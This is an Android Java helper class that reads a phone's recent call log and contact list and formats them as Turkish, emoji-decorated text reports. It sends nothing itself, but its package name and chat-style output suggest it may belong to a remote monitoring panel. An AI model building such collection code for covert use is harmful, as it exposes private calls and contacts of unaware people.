package com.java.panel;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.ContactsContract;

public class CallLogHelper {
    public static String getCallLogs(Context context) {
        StringBuilder sb = new StringBuilder("📞 Son Aramalar:\n\n");
        try {
            // Android ContentResolver SQL sorgularında LIMIT doğrudan sortOrder içine yazılmaz, bazı sürümlerde hata verir. Güvenli döngü ile sınırlandırıldı.
            Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (cursor != null) {
                int numIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int durIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
                int count = 0;
                while (cursor.moveToNext() && count < 10) {
                    String number = numIdx != -1 ? cursor.getString(numIdx) : "Bilinmiyor";
                    String duration = durIdx != -1 ? cursor.getString(durIdx) : "0";
                    sb.append("No: ").append(number).append(" | Süre: ").append(duration).append("sn\n------------------\n");
                    count++;
                }
                cursor.close();
            } else {
                return "📞 Arama kaydı bulunamadı.";
            }
        } catch (Exception e) {
            return "❌ Arama geçmişi okunamadı: " + e.getMessage();
        }
        return sb.toString();
    }

    public static String getContacts(Context context) {
        StringBuilder sb = new StringBuilder("📇 Kişi Rehberi:\n\n");
        try {
            Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                int count = 0;
                while (cursor.moveToNext() && count < 30) {
                    String name = nameIdx != -1 ? cursor.getString(nameIdx) : "İsimsiz";
                    String phone = numIdx != -1 ? cursor.getString(numIdx) : "";
                    sb.append("İsim: ").append(name).append("\nTel: ").append(phone).append("\n------------------\n");
                    count++;
                }
                cursor.close();
            } else {
                return "📇 Rehber boş veya erişilemedi.";
            }
        } catch (Exception e) {
            return "❌ Rehber okunamadı: " + e.getMessage();
        }
        return sb.toString();
    }
}
